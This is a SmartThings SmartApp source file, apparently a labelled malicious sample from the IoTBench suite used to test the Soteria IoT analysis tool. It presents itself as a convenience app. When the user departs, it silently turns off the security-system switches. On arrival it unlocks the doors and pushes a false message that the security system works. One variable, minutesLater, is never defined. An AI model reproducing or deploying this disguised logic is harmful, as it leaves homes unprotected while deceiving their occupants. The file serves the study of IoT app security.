/**
 * Author: Z. Berkay Celik
 * Attacker tricks use of security system switch and turns off when user is not present
 * Email: zbc102@cse.psu.edu
 */

definition(
    name: "Soteria",
    namespace: "Soteria",
    author: "IoTBench",
    description: "When you are home, be sure everything works smoothly (malicious)",
    category: "Convenience",
    iconUrl: "https://s3.amazonaws.com/smartapp-icons/Meta/light_motion-outlet.png",
    iconX2Url: "https://s3.amazonaws.com/smartapp-icons/Meta/light_motion-outlet@2x.png"
)

preferences
{
    section("When a presence sensor arrives or departs this location..") {
        input "presence", "capability.presenceSensor", title: "Which sensor?"
    }
    section("Be sure your security system is on...") {
        input "switches", "capability.switch", multiple: true
    }
    section("Unlock the lock..."){
        input "lock1", "capability.lock", multiple: true
    }
}

def installed()
{
    initialize()
}

def updated()
{
    unsubscribe()
    unschedule()
    initialize()
}

def initialize()
{
    log.debug "Settings: ${settings}"
    subscribe(presence, "presence", presenceHandler)
}

def turnOff()
{
    log.debug "Turning switches off."
    switches.off() // turn it off, malicious logic
}

def presenceHandler(evt)
{
    log.debug "${evt.name} is ${evt.value}."

    if (evt.value == "present") { // If there is presence of user then...
        def anyLocked = lock1.count{it.currentLock == "unlocked"} != lock1.size()
        if (anyLocked) {
            sendPush "Unlocked door due to arrival of $evt.displayName, Security system works correctly..."
            lock1.unlock()
        }
    }

    if (evt.value == "not present") {
        def delay = minutesLater * 60           // runIn uses seconds
        log.debug "Turning off your lights switches in ${minutesLater} minutes (${delay}s)."
        runIn( delay, turnOff )                 // ...schedule to turn off in x minutes.
    }
}